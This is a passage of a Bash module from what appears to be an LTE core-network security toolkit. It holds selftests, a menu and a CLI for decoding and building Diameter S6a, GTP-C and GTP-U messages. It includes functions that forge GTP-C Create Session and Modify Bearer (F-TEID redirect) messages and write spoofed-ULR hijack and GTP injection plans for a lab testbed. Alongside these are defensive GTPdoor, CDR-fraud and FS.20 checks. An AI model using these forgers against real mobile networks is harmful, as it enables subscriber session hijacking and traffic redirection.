    # Requested-EUTRAN-Authentication-Info AVP, so walk the group rather
    # than looking for it at the top level.
    chk air-grouped      "$(printf '%s\n' "$out" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.name$/ && $2=="Requested-EUTRAN-Authentication-Info"{print "yes"; exit}')" "yes"
    local gidx gdata
    gidx=$(printf '%s\n' "$out" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.code$/ && $2=="1408"{sub(/\.code$/,"",$1); print $1; exit}')
    chk air-grouped-idx-nonempty "$([[ -n "$gidx" ]] && echo yes || echo no)" "yes"
    gdata=$(printf '%s\n' "$out" | awk -F'\t' -v k="${gidx}.data" '$1==k{print $2; exit}')
    local gout; gout=$(lcore_diameter_parse_avps "$gdata")
    chk air-nvectors     "$(printf '%s\n' "$gout" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.decoded$/ && $2=="Number-Of-Requested-Vectors=1"{print "yes"; exit}')" "yes"
    chk air-irp          "$(printf '%s\n' "$gout" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.decoded$/ && $2=="Immediate-Response-Preferred=0"{print "yes"; exit}')" "yes"
    chk air-group-inner-count "$(printf '%s\n' "$gout" | awk -F'\t' '$1=="avp_count"{print $2; exit}')" "2"
    chk air-flags        "$(fld "$out" flags)" "C0"

    out=$(lcore_cmd_build_ulr 310150123456789); rc=$?
    chk ulr-rc    "$rc" "0"
    chk ulr-cmd   "$(fld "$out" roundtrip_command)" "316"
    chk ulr-lenok "$(fld "$out" roundtrip_length_ok)" "yes"
    out=$(lcore_cmd_decode_diameter "$(fld "$out" hex)")
    chk ulr-name  "$(fld "$out" command_name)" "Update-Location (ULR/ULA)  [S6a/S6d]"
    chk ulr-rat   "$(printf '%s\n' "$out" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.decoded$/ && $2=="Network-Access-Mode=6"{print "yes"; exit}')" "yes"

    # Builders validate their input.
    chk air-bad-imsi "$(lcore_cmd_build_air 123 >/dev/null 2>&1; echo $?)" "1"
    chk ulr-bad-imsi "$(lcore_cmd_build_ulr abc >/dev/null 2>&1; echo $?)" "1"
    chk air-bad-nv   "$(lcore_build_air 310150123456789 mme.localdomain localdomain 9 >/dev/null 2>&1; echo $?)" "2"
    # CLR uses 320/321, not the 319 the brief listed for Cancel-Location.
    local clr; clr=$(lcore_build_clr 310150123456789 hss.localdomain localdomain 0)
    out=$(lcore_diameter_parse_header "$clr")
    chk clr-cmd  "$(fld "$out" command_code)" "317"
    chk clr-name "$(fld "$out" command_name)" "Cancel-Location (CLR/CLA)  [S6a/S6d]"

    # ── 6. GTP-C header parse with TEID and sequence ────────────────────
    # Hand-built Create Session Request:
    #   48        flags: version 2, T=1
    #   20        message type 32 (Create Session Request)
    #   0008      length 8
    #   00000001  TEID 1
    #   000001    sequence 1
    #   00        spare
    local gtp="482000080000000100000100"
    out=$(lcore_gtpc_parse_header "$gtp"); rc=$?
    chk gtp-rc      "$rc" "0"
    chk gtp-version "$(fld "$out" version)" "2"
    chk gtp-proto   "$(fld "$out" protocol)" "GTPv2-C"
    chk gtp-T       "$(fld "$out" flag_T)" "1"
    chk gtp-mtype   "$(fld "$out" message_type)" "32"
    chk gtp-mname   "$(fld "$out" message_name)" "Create Session Request"
    chk gtp-len     "$(fld "$out" length)" "8"
    chk gtp-teid    "$(fld "$out" teid)" "1"
    chk gtp-teidhex "$(fld "$out" teid_hex)" "00000001"
    chk gtp-seq     "$(fld "$out" sequence_number)" "1"
    chk gtp-spare   "$(fld "$out" spare)" "00"
    chk gtp-payload-octets "$(fld "$out" payload_octets)" "0"

    # Echo Request (type 1) with no TEID: flags 0x40, no T bit.
    local echo="4001000400000100"
    out=$(lcore_gtpc_parse_header "$echo")
    chk echo-mtype "$(fld "$out" message_type)" "1"
    chk echo-name  "$(fld "$out" message_name)" "Echo Request"
    chk echo-teid  "$(fld "$out" teid)" "none"
    chk echo-seq   "$(fld "$out" sequence_number)" "1"

    # Echo Response (type 2).
    out=$(lcore_gtpc_parse_header "4002000400000100")
    chk echoresp-name "$(fld "$out" message_name)" "Echo Response"

    # A large TEID and sequence must survive the 32-bit / 24-bit reads.
    out=$(lcore_gtpc_parse_header "48200008DEADBEEFFFFFFF00")
    chk gtp-bigteid "$(fld "$out" teid)" "3735928559"
    chk gtp-bigseq  "$(fld "$out" sequence_number)" "16777215"

    chk gtp-short  "$(lcore_gtpc_parse_header 48 >/dev/null 2>&1; echo $?)" "1"
    chk gtp-nonhex "$(lcore_gtpc_parse_header zz >/dev/null 2>&1; echo $?)" "1"
    chk gtp-missing "$(lcore_cmd_decode_gtp_c >/dev/null 2>&1; echo $?)" "2"
    chk gtpu-missing "$(lcore_cmd_decode_gtp_u >/dev/null 2>&1; echo $?)" "2"

    # ── 7. GTP-C IE format and types ────────────────────────────────────
    # IMSI IE (type 1): type 01, length 0008, instance 00, then
    # digit-count 0F + 8 BCD octets for 15-digit 310150123456789.
    # BCD of 310150123456789 is 13 10 05 21 43 65 87 F9.
    local imsi_ie="010009000F13100521436587F9"
    out=$(lcore_gtpc_parse_ies "$imsi_ie"); rc=$?
    chk gtpie-rc     "$rc" "0"
    chk gtpie-type   "$(fld "$out" ie.0.type)" "1"
    chk gtpie-name   "$(fld "$out" ie.0.name)" "IMSI"
    chk gtpie-len    "$(fld "$out" ie.0.length)" "9"
    chk gtpie-spare  "$(fld "$out" ie.0.spare)" "0"
    chk gtpie-inst   "$(fld "$out" ie.0.instance)" "0"
    chk gtpie-dec    "$(fld "$out" ie.0.decoded)" "IMSI=310150123456789"
    chk gtpie-count  "$(fld "$out" ie_count)" "1"

    # Cause IE (type 2), value 16 (Request accepted).
    out=$(lcore_gtpc_parse_ies "0200010010000000")
    chk gtpie-cause "$(fld "$out" ie.0.decoded)" "Cause=16"
    chk gtpie-cname "$(fld "$out" ie.0.name)" "Cause"

    # APN IE (71) "internet" = 08 69 6E 74 65 72 6E 65 74
    local apn_ie="4700090008696E7465726E6574"
    out=$(lcore_gtpc_parse_ies "$apn_ie")
    chk gtpie-apn-type "$(fld "$out" ie.0.type)" "71"
    chk gtpie-apn-name "$(fld "$out" ie.0.name)" "APN"
    chk gtpie-apn-dec  "$(fld "$out" ie.0.decoded)" "APN=internet"

    # MSISDN IE (3) with a 10-digit number.
    # digits 0123456789 -> BCD 10 32 54 76 98, count 0A
    out=$(lcore_gtpc_parse_ies "030006000A1032547698")
    chk gtpie-msisdn "$(fld "$out" ie.0.decoded)" "MSISDN=0123456789"

    # IE type registry (the numbers the brief names).
    chk ien-1  "$(lcore_gtpc_ie_name 1)"  "IMSI"
    chk ien-2  "$(lcore_gtpc_ie_name 2)"  "Cause"
    chk ien-3  "$(lcore_gtpc_ie_name 3)"  "Recovery (Restart Counter)"
    chk ien-71 "$(lcore_gtpc_ie_name 71)" "APN"
    chk ien-86 "$(lcore_gtpc_ie_name 86)" "F-Container"
    chk ien-87 "$(lcore_gtpc_ie_name 87)" "F-Cause"
    chk ien-93 "$(lcore_gtpc_ie_name 93)" "Bearer Context"
    chk ien-114 "$(lcore_gtpc_ie_name 114)" "ULI (User Location Information)"
    chk ien-unknown "$(lcore_gtpc_ie_name 60000)" "unknown/extension IE type"

    # TAI and ECGI as they appear INSIDE the ULI IE (114), not as IE 86/87.
    # TAI = PLMN 02F810 (plain BCD) + TAC 0x1234.
    chk tai-dec "$(lcore_tai_decode 02F8101234)" "208-01 tac=4660"
    # ECGI = PLMN + ECI 0x0000ABCD = 43981.
    chk ecgi-dec "$(lcore_ecgi_decode 02F8100000ABCD)" "208-01 eci=43981"
    # ULI with the ECGI flag (0x10) set.
    out=$(lcore_uli_decode "1002F8100000ABCD")
    chk uli-flags   "$(fld "$out" uli.flags)" "16"
    chk uli-ecgi    "$(fld "$out" uli.ecgi)" "208-01 eci=43981"
    chk uli-present "$(fld "$out" uli.present)" "ECGI "
    # ULI with the TAI flag (0x08) set.
    out=$(lcore_uli_decode "0802F8101234")
    chk uli-tai "$(fld "$out" uli.tai)" "208-01 tac=4660"
    # ULI with both TAI and ECGI.
    out=$(lcore_uli_decode "1802F810123402F8100000ABCD")
    chk uli-both-present "$(fld "$out" uli.present)" "TAI ECGI "
    chk uli-both-tai     "$(fld "$out" uli.tai)" "208-01 tac=4660"
    chk uli-both-ecgi    "$(fld "$out" uli.ecgi)" "208-01 eci=43981"

    # An IE that overruns the buffer must be an error, not a silent truncation.
    chk gtpie-overrun "$(lcore_gtpc_parse_ies 0100FF0001 >/dev/null 2>&1; echo $?)" "1"

    # Two IEs in sequence, with 4-octet padding between them.
    # IE1: type 02 len 0002 inst 00 value 0010 (4 octets total, aligned).
    # IE2: type 01 len 0009 inst 00 value <9 octets> -> total 13, pad 3.
    out=$(lcore_gtpc_parse_ies "0200010010000000${imsi_ie}000000")
    chk gtpie-two-count "$(fld "$out" ie_count)" "2"
    chk gtpie-two-0     "$(fld "$out" ie.0.type)" "2"
    chk gtpie-two-1     "$(fld "$out" ie.1.type)" "1"
    chk gtpie-two-1dec  "$(fld "$out" ie.1.decoded)" "IMSI=310150123456789"

    # ── 8. GTP-U header and extension-header walk ───────────────────────
    # G-PDU: flags 0x30 (version 1, PT 1), type 0xFF, length 4, TEID 1,
    # then 4 octets of payload. No optional fields.
    out=$(lcore_gtpu_parse_header "30FF000400000001DEADBEEF"); rc=$?
    chk gtpu-rc      "$rc" "0"
    chk gtpu-version "$(fld "$out" version)" "1"
    chk gtpu-proto   "$(fld "$out" protocol)" "GTPv1-U"
    chk gtpu-PT      "$(fld "$out" flag_PT)" "1"
    chk gtpu-E       "$(fld "$out" flag_E)" "0"
    chk gtpu-S       "$(fld "$out" flag_S)" "0"
    chk gtpu-mtype   "$(fld "$out" message_type)" "0xFF"
    chk gtpu-mname   "$(fld "$out" message_name)" "G-PDU (T-PDU)"
    chk gtpu-teid    "$(fld "$out" teid)" "1"
    chk gtpu-payload "$(fld "$out" payload)" "DEADBEEF"
    chk gtpu-extcount "$(fld "$out" ext_count)" "0"

    # Echo Request (type 1) with sequence number, no extension header.
    out=$(lcore_gtpu_parse_header "3201000400000001000100")
    chk gtpu-echo-mtype "$(fld "$out" message_type)" "0x01"
    chk gtpu-echo-name  "$(fld "$out" message_name)" "Echo Request"

    # A G-PDU with an extension header chain:
    #   flags 0x34 = version 1, PT 1, E 1
    #   type FF, length 0008, TEID 00000001
    #   seq 0001, npdu 00, next-type 0x40 (UDP Port)
    #   ext: units 01, content 0000, next 0x00  -> ends the chain
    # flags 0x37 = version 1, PT 1, E 1, S 1, PN 1, so all four trailer
    # fields are present.
    local with_ext="37FF000C000000010001004001000000"
    out=$(lcore_gtpu_parse_header "$with_ext"); rc=$?
    chk gtpu-ext-rc    "$rc" "0"
    chk gtpu-ext-E     "$(fld "$out" flag_E)" "1"
    chk gtpu-ext-S     "$(fld "$out" flag_S)" "1"
    chk gtpu-ext-seq   "$(fld "$out" sequence_number)" "1"
    chk gtpu-ext-npdu  "$(fld "$out" npdu_number)" "0"
    chk gtpu-ext-next  "$(fld "$out" next_extension_header_type)" "0x40"
    chk gtpu-ext-nextn "$(fld "$out" next_extension_header_name)" "UDP Port"
    chk gtpu-ext-count "$(fld "$out" ext_count)" "1"
    chk gtpu-ext0-type "$(fld "$out" ext.0.type)" "0x40"
    chk gtpu-ext0-name "$(fld "$out" ext.0.name)" "UDP Port"
    chk gtpu-ext0-units "$(fld "$out" ext.0.units)" "1"
    chk gtpu-ext0-oct  "$(fld "$out" ext.0.octets)" "4"

    # Extension header type registry.
    chk ext-00  "$(lcore_gtpu_ext_name 0)"    "No more extension headers"
    chk ext-01  "$(lcore_gtpu_ext_name 1)"    "MBMS Support Indication"
    chk ext-03  "$(lcore_gtpu_ext_name 3)"    "Long PDCP PDU Number"
    chk ext-20  "$(lcore_gtpu_ext_name 32)"   "Service Class Indicator"
    chk ext-40  "$(lcore_gtpu_ext_name 64)"   "UDP Port"
    chk ext-85  "$(lcore_gtpu_ext_name 133)"  "PDU Session Container"
    chk ext-c0  "$(lcore_gtpu_ext_name 192)"  "PDCP PDU Number"
    chk ext-c1  "$(lcore_gtpu_ext_name 193)"  "Suspend Request"
    chk ext-unk "$(lcore_gtpu_ext_name 200)"  "unknown extension header"
    chk gtpu-mname-2 "$(lcore_gtpu_msg_name 2)"   "Echo Response"
    chk gtpu-mname-26 "$(lcore_gtpu_msg_name 26)" "Error Indication"

    chk gtpu-short  "$(lcore_gtpu_parse_header 30FF >/dev/null 2>&1; echo $?)" "1"
    chk gtpu-nonhex "$(lcore_gtpu_parse_header zz >/dev/null 2>&1; echo $?)" "1"

    # ── 9. S1AP tables ──────────────────────────────────────────────────
    out=$(lcore_s1ap_procedures)
    chk s1ap-proc-count "$(printf '%s\n' "$out" | grep -c .)" "45"
    chk s1ap-initial   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="InitialUEMessage"{print $2}')" "12"
    chk s1ap-uplink    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="UplinkNASTransport"{print $2}')" "13"
    chk s1ap-downlink  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="DownlinkNASTransport"{print $2}')" "11"
    chk s1ap-paging    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="Paging"{print $2}')" "10"
    out=$(lcore_s1ap_identity_procedures)
    chk s1ap-id-count "$(printf '%s\n' "$out" | grep -c .)" "6"
    chk s1ap-id-12    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="InitialUEMessage"{print $2}')" "12"

    # ── 10. Attack-surface notes ────────────────────────────────────────
    out=$(lcore_surface_notes)
    chk surf-count   "$(printf '%s\n' "$out" | grep -c .)" "6"
    chk surf-diam    "$(printf '%s\n' "$out" | grep -c 'unprotected-diameter-peer')" "1"
    chk surf-ulr     "$(printf '%s\n' "$out" | grep -c 'spoofed-ulr')" "1"
    chk surf-gtpc    "$(printf '%s\n' "$out" | grep -c 'gtpc-create-session-injection')" "1"
    chk surf-sctp    "$(printf '%s\n' "$out" | grep -c 'sctp-multihoming')" "1"
    chk surf-gtpu    "$(printf '%s\n' "$out" | grep -c 'gtpu-teid-guessing')" "1"

    # ── 11. Plan files carry status: handoff ────────────────────────────
    local plan
    for plan in ulr-hijack gtp-inject sctp-scan; do
        local pout pf; pout=$(lcore_cmd_plan "$plan"); rc=$?
        chk "plan-$plan-rc" "$rc" "0"
        # The verb reports handoff and the path, so extract the path.
        chk "plan-$plan-verb-status" "$(fld "$pout" status)" "handoff"
        pf=$(fld "$pout" plan_file)
        [[ -f "$pf" ]] || { chk "plan-$plan-file" "missing" "present"; continue; }
        chk "plan-$plan-status" "$(grep -c '^status: handoff$' "$pf")" "1"
        chk "plan-$plan-requires" "$(grep -c '^requires: ' "$pf")" "1"
        chk "plan-$plan-nonempty" "$([[ -s "$pf" ]] && echo yes || echo no)" "yes"
        chk "plan-$plan-module" "$(grep -c '^module: 11_lte_core.sh' "$pf")" "1"
    done
    # The handoff must name the hardware, not just say "handoff".
    chk plan-ulr-needs-hss "$([[ "$(grep -c 'lab HSS' "$LCORE_PLANS/ulr-hijack.plan")" -ge 1 ]] && echo yes || echo no)" "yes"
    chk plan-gtp-needs-epc "$([[ "$(grep -c 'lab EPC' "$LCORE_PLANS/gtp-inject.plan")" -ge 1 ]] && echo yes || echo no)" "yes"
    chk plan-sctp-needs-mme "$([[ "$(grep -c 'lab MME' "$LCORE_PLANS/sctp-scan.plan")" -ge 1 ]] && echo yes || echo no)" "yes"
    chk plan-bad "$(lcore_cmd_plan nope >/dev/null 2>&1; echo $?)" "2"
    chk plan-missing "$(lcore_cmd_plan >/dev/null 2>&1; echo $?)" "2"

    # ── 12. Hardware guard names the missing core ───────────────────────
    local have; have=$(lcore_find_core_testbed) || have=""
    if [[ -z "$have" ]]; then
        local em; em=$(lcore_require_core 2>&1) || true
        chk core-names-open5gs "$(printf '%s' "$em" | grep -c 'Open5GS')" "1"
        chk core-names-free5gc "$(printf '%s' "$em" | grep -c 'free5GC')" "1"
        chk core-absent-rc "$(lcore_require_core >/dev/null 2>&1; echo $?)" "1"
    else
        chk core-present-rc "$(lcore_require_core >/dev/null 2>&1; echo $?)" "0"
    fi

    # ── 13. Decoders, helpers and dispatch ──────────────────────────────
    chk apn-none   "$(lcore_apn_decode 00)" ""
    chk apn-single "$(lcore_apn_decode 04696E666F)" "info"
    chk apn-multi  "$(lcore_apn_decode 08696E7465726E65740361706E)" "internet.apn"
    chk ascii-hello "$(lcore_hex_to_ascii 68656C6C6F)" "hello"
    chk ipv4       "$(lcore_hex_to_ipv4 0A000001)" "10.0.0.1"
    chk bcd-10     "$(lcore_bcd_decode 0A1032547698)" "0123456789"
    chk bcd-15     "$(lcore_bcd_decode 0F13100521436587F9)" "310150123456789"
    chk cli-unknown "$(lcore_cli_main --nope >/dev/null 2>&1; echo $?)" "2"

    out=$(lcore_cli_status_tsv)
    chk status-tag    "$(fld "$out" tag)" "lcore"
    chk status-dir    "$(fld "$out" dir)" "$LCORE_DIR"
    chk status-appid  "$(fld "$out" s6a_app_id)" "16777251"
    chk status-plans  "$(fld "$out" plans)" "3"

    # Sanitisation: an untrusted string cannot forge a TSV row.
    chk san-tab "$(lcore_sanitize $'a\tb')" "a b"
    chk san-nl  "$(lcore_sanitize $'a\nb')" "a b"
    chk san-cr  "$(lcore_sanitize $'a\rb')" "a b"
    # A non-printable Diameter value must fall back to hex, not emit a tab.
    chk dh-utf8-np "$(lcore_diameter_utf8 0909)" "0909"

    # ── GTP-C session hijack ────────────────────────────────────────────
    # IMSI BCD: 310150123456789 -> 13 10 05 21 43 65 87 F9 (odd tail F).
    chk gtp-bcd "$(lcore_bcd_encode 310150123456789)" "13100521436587F9"
    chk gtp-bcd-even "$(lcore_bcd_encode 1234)" "2143"
    chk gtp-plmn "$(lcore_plmn_bcd 310 260)" "130062"
    chk gtp-apn "$(lcore_apn_encode internet)" "08696e7465726e6574"
    # Create Session Request: type byte 0x20 (32), no T flag (0x40).
    local csr; csr=$(lcore_cmd_gtp_csr_forge 310150123456789 internet)
    chk csr-type "$(printf '%s' "$csr" | awk -F'\t' '$1=="message_type"{print $2}')" "32"
    chk csr-flag "$(printf '%s' "$csr" | awk -F'\t' '$1=="message"{print substr($2,1,2)}')" "40"
    # IMSI IE header: type 01, length 0008, instance 00.
    chk csr-imsi-ie "$(printf '%s' "$csr" | awk -F'\t' '$1=="imsi_ie"{print substr($2,1,6)}')" "010008"
    # Modify Bearer: type 0x22 (34) with T flag (0x48) and the TEID.
    local mb; mb=$(lcore_cmd_gtp_modify_bearer DEADBEEF 5)
    chk mb-type "$(printf '%s' "$mb" | awk -F'\t' '$1=="message_type"{print $2}')" "34"
    chk mb-flag "$(printf '%s' "$mb" | awk -F'\t' '$1=="message"{print substr($2,1,2)}')" "48"
    chk mb-teid "$(printf '%s' "$mb" | awk -F'\t' '$1=="message"{print substr($2,9,8)}')" "DEADBEEF"
    # GTPdoor: a clean Echo (Recovery only) is clean; an Echo with an extra IE flags.
    chk gtpdoor-clean "$(lcore_cmd_gtpdoor "4001000c0000000003000100000000" | awk -F'\t' '$1=="findings"{print $2}')" "0"
    chk gtpdoor-flag  "$(lcore_cmd_gtpdoor "4001000c0000000001000100000000" | awk -F'\t' '$1=="findings"{print ($2>0)?"y":"n"}')" "y"
    # CDR fraud: a 30x volume spike is overbilling.
    printf 'imsi\tbytes\tavg\n310260000000001\t3000\t100\n310260000000002\t120\t100\n' > "$d/cdr.tsv"
    chk cdr-over "$(lcore_cmd_cdr_fraud "$d/cdr.tsv" | awk -F'\t' '$1=="310260000000001"{print $5}')" "OVERBILLING"
    chk cdr-normal "$(lcore_cmd_cdr_fraud "$d/cdr.tsv" | awk -F'\t' '$1=="310260000000002"{print $5}')" "normal"
    chk cdr-missing "$(lcore_cmd_cdr_fraud "$d/none.tsv" >/dev/null 2>&1; echo $?)" "1"
    # FS.20: an empty config is missing every control.
    printf 'imsi_plmn_consistency=true\n' > "$d/fs20.tsv"
    chk fs20-missing "$(lcore_cmd_fs20 "$d/fs20.tsv" | awk -F'\t' '$1=="controls_missing"{print $2}')" "4"
    chk fs20-present "$(lcore_cmd_fs20 "$d/fs20.tsv" | awk -F'\t' '$1=="imsi_plmn_consistency"{print $2}')" "yes"

    rm -rf "$d"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── menu ────────────────────────────────────────────────────────────────
lcore_menu() {
    while true; do
        banner
        echo -e "  ${C_MAG}=== LTE Core (EPC) ===${C_RESET}"
        echo -e "  testbed: ${C_GRN}$(lcore_find_core_testbed || echo none)${C_RESET}"
        echo -e "  plans:   ${C_GRN}$(find "$LCORE_PLANS" -name '*.plan' -type f 2>/dev/null | wc -l)${C_RESET}"
        echo -e "  dir:     ${C_DIM}$LCORE_PLANS${C_RESET}\n"
        cat << 'M'
  [1]  decode a Diameter message (hex)
  [2]  decode a GTP-C v2 message (hex)
  [3]  decode a GTP-U packet (hex)
  [4]  build an AIR (S6a Authentication-Information-Request)
  [5]  build a ULR (S6a Update-Location-Request)
  [6]  plan: spoofed ULR / location hijack
  [7]  plan: GTP-C Create Session injection
  [8]  plan: SCTP multihoming review
  [9]  S1AP procedure / identity reference
  [10] attack surface notes
  [11] status
  [0]  back

M
        read -rp "  choice> " c || return 0  # EOF: leave the menu cleanly
        case "$c" in
            1) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need hex; cannot prompt in CLI mode" >&2
               else read -rp "  Diameter hex> " h
                    lcore_cmd_decode_diameter "$h" | column -t -s$'\t' 2>/dev/null || lcore_cmd_decode_diameter "$h"
                    read -rp "  press enter " _; fi ;;
            2) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need hex; cannot prompt in CLI mode" >&2
               else read -rp "  GTP-C hex> " h
                    lcore_cmd_decode_gtp_c "$h" | column -t -s$'\t' 2>/dev/null || lcore_cmd_decode_gtp_c "$h"
                    read -rp "  press enter " _; fi ;;
            3) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need hex; cannot prompt in CLI mode" >&2
               else read -rp "  GTP-U hex> " h
                    lcore_cmd_decode_gtp_u "$h" | column -t -s$'\t' 2>/dev/null || lcore_cmd_decode_gtp_u "$h"
                    read -rp "  press enter " _; fi ;;
            4) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an IMSI; cannot prompt in CLI mode" >&2
               else read -rp "  IMSI> " i
                    lcore_cmd_build_air "$i" | column -t -s$'\t' 2>/dev/null || lcore_cmd_build_air "$i"
                    read -rp "  press enter " _; fi ;;
            5) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an IMSI; cannot prompt in CLI mode" >&2
               else read -rp "  IMSI> " i
                    lcore_cmd_build_ulr "$i" | column -t -s$'\t' 2>/dev/null || lcore_cmd_build_ulr "$i"
                    read -rp "  press enter " _; fi ;;
            6) lcore_cmd_plan ulr-hijack; read -rp "  press enter " _ ;;
            7) lcore_cmd_plan gtp-inject; read -rp "  press enter " _ ;;
            8) lcore_cmd_plan sctp-scan;  read -rp "  press enter " _ ;;
            9) lcore_s1ap_identity_procedures | column -t -s$'\t' 2>/dev/null || lcore_s1ap_identity_procedures
               read -rp "  press enter " _ ;;
            10) lcore_surface_notes | column -t -s$'\t' 2>/dev/null || lcore_surface_notes
                read -rp "  press enter " _ ;;
            11) lcore_cli_status_tsv | column -t -s$'\t' 2>/dev/null || lcore_cli_status_tsv
                read -rp "  press enter " _ ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ── CLI dispatch ────────────────────────────────────────────────────────
lcore_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)    lcore_cli_status_tsv ;;
        --decode-diameter) lcore_cmd_decode_diameter "${1:-}" ;;
        --decode-gtp-c)  lcore_cmd_decode_gtp_c "${1:-}" ;;
        --decode-gtp-u)  lcore_cmd_decode_gtp_u "${1:-}" ;;
        --build-air)     lcore_cmd_build_air "${1:-310150123456789}" ;;
        --build-ulr)     lcore_cmd_build_ulr "${1:-310150123456789}" ;;
        --gtp-csr-forge) lcore_cmd_gtp_csr_forge "${1:-310150123456789}" "${2:-internet}" "${3:-310}" "${4:-260}" ;;
        --gtp-modify-bearer) lcore_cmd_gtp_modify_bearer "${1:-}" "${2:-5}" ;;
        --gtpdoor-detect) lcore_cmd_gtpdoor "${1:-}" ;;
        --cdr-fraud-check) lcore_cmd_cdr_fraud "${1:-}" ;;
        --fs20-audit)    lcore_cmd_fs20 "${1:-}" ;;
        --plan)          lcore_cmd_plan "${1:-}" ;;
        --s1ap)          lcore_s1ap_identity_procedures ;;
        --surface)       lcore_surface_notes ;;
        --require-core)  lcore_require_core ;;
        --selftest)      lcore_selftest ;;
        --menu)          lcore_menu ;;
        *)
            cat >&2 <<EOF
LTE Core (EPC) — Diameter S6a/S6d, GTP-C v2, GTP-U, S1-MME

Usage: $0 COMMAND
  --status-tsv                module state as TSV
  --decode-diameter <hex>     parse a Diameter header and walk its AVPs
  --decode-gtp-c <hex>        parse a GTP-C v2 header and walk its IEs
  --decode-gtp-u <hex>        parse a GTP-U header and its extension chain
  --build-air [IMSI]          build an S6a Authentication-Information-Request
  --build-ulr [IMSI]          build an S6a Update-Location-Request
  --gtp-csr-forge [IMSI] [APN] [MCC] [MNC]
                              forge a GTP-C Create Session Request
  --gtp-modify-bearer <TEID> [EBI]
                              forge a GTP-C Modify Bearer (F-TEID redirect)
  --gtpdoor-detect <hex>      GTPdoor-class Echo abuse detection
  --cdr-fraud-check <tsv>     CDR overbilling/bypass anomaly
  --fs20-audit <config>       GSMA FS.20 GTP interconnect controls
  --plan <ulr-hijack|gtp-inject|sctp-scan>
                              write a handed-off plan naming the testbed
  --s1ap                      S1AP identity-carrying procedures
  --surface                   attack surface notes
  --require-core              report the EPC testbed, by name if absent
  --selftest                  verify the codecs without a core network
  --menu                      interactive menu
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    : "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
    : "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
    : "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
    : "${STATE_DIR:=$IMSISTING_ROOT/state}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    lcore_cli_main "$@"
fi
